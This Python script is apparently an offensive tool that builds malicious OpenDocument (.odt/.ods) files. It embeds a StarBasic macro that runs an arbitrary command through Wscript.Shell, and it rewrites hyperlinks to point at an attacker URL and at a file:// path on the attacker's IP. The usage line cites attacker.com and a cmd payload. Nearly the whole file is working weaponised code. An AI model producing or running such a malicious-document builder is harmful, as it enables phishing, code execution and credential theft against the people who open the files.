import zipfile
import os
import sys
import argparse
from lxml import etree


def generate_macro_xml(payload):
    """Generate the macro XML content"""
    macro_payload = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE script:module PUBLIC "-//OpenOffice.org//DTD OfficeDocument 1.0//EN" "module.dtd">
<script:module xmlns:script="http://openoffice.org/2000/script" script:name="Module1" script:language="StarBasic" script:moduleType="normal">REM ***** BASIC *****

'''    
    macro_payload= macro_payload + """
Sub Main
	Dim Str as String

"""

    for i in range(0, len(payload), 50):
        macro_payload = macro_payload + "        Str = Str + " + '"' + payload[i:i + 50] + '"\n'

    macro_payload = macro_payload + """
	CreateObject("Wscript.Shell").Run Str
End Sub
</script:module>"""

    return macro_payload



def generate_od(output_filename, link, payload):
    content_xml_file = "content.xml"
    manifest_xml_file = "manifest.xml"
    script_lb_xml_file = "script-lb.xml"
    script_lc_xml_file = "script-lc.xml"

    try:
        # Create a new ODT file (which is a ZIP archive)
        target_ip=link.split('/')[2].split(':')[0]
        with zipfile.ZipFile(output_filename, 'w', zipfile.ZIP_DEFLATED) as od:
            # Parse and modify content.xml
            content_xml = etree.parse(content_xml_file)
            root = content_xml.getroot()
            
            # Find and replace links in the XML
            namespaces = {
                'office': 'urn:oasis:names:tc:opendocument:xmlns:office:1.0',
                'text': 'urn:oasis:names:tc:opendocument:xmlns:text:1.0',
                'xlink': 'http://www.w3.org/1999/xlink'
            }
            
            # Find all links (hyperlinks in ODT are usually text:a elements)
            for link_elem in root.xpath('//text:a', namespaces=namespaces):
                if '{http://www.w3.org/1999/xlink}href' in link_elem.attrib:
                    if link_elem.attrib['{http://www.w3.org/1999/xlink}href'] == "link":
                        link_elem.attrib['{http://www.w3.org/1999/xlink}href'] = link
                    elif link_elem.attrib['{http://www.w3.org/1999/xlink}href'] == "file":
                        link_elem.attrib['{http://www.w3.org/1999/xlink}href'] = "file://" + target_ip + "/test.jpg"
            
            # Also check for other possible link elements
            for link_elem in root.xpath('//*[@xlink:href]', namespaces=namespaces):
                if link_elem.attrib['{http://www.w3.org/1999/xlink}href'] == "link":
                    link_elem.attrib['{http://www.w3.org/1999/xlink}href'] = link
                elif link_elem.attrib['{http://www.w3.org/1999/xlink}href'] == "file":
                    link_elem.attrib['{http://www.w3.org/1999/xlink}href'] = "file://" + target_ip + "/test.jpg"

            # Convert modified XML back to string
            modified_content = etree.tostring(content_xml, encoding='utf-8', xml_declaration=True, pretty_print=True)

            # Add required ODT files
            if output_filename.endswith('.odt'):
                od.writestr('mimetype', 'application/vnd.oasis.opendocument.text', 
                        compress_type=zipfile.ZIP_STORED)
            elif output_filename.endswith('.ods'):
                od.writestr('mimetype', 'application/vnd.oasis.opendocument.spreadsheet', 
                        compress_type=zipfile.ZIP_STORED)
            else:
                raise ValueError("Output filename must end with .odt or .ods")
            
            # Add modified content.xml to ODT
            od.writestr('Basic/Standard/Module1.xml', generate_macro_xml(payload), compress_type=zipfile.ZIP_DEFLATED)
            od.writestr('Basic/Standard/script-lb.xml', open(script_lb_xml_file, 'r').read(), compress_type=zipfile.ZIP_DEFLATED)
            od.writestr('Basic/script-lc.xml', open(script_lc_xml_file, 'r').read(), compress_type=zipfile.ZIP_DEFLATED)
            od.writestr('content.xml', modified_content, compress_type=zipfile.ZIP_DEFLATED)
            od.writestr("META-INF/manifest.xml", open(manifest_xml_file, 'r').read(), compress_type=zipfile.ZIP_DEFLATED)

        print(f"Successfully created {output_filename}")
            
    except Exception as e:
        print(f"An error occurred: {e}")
        sys.exit(1)


if __name__ == "__main__":
    if len(sys.argv) < 3 :
        print("Usage: python generate_od.py <output.odt> <link> <payload>")
        print("Example: python generate_od.py crafted.odt http://attacker.com/payload 'cmd /c calc.exe'")
        sys.exit(1)
    
    output_file = sys.argv[1]
    malicious_link = sys.argv[2]
    macro_payload = sys.argv[3]
    generate_od(output_file, malicious_link, macro_payload)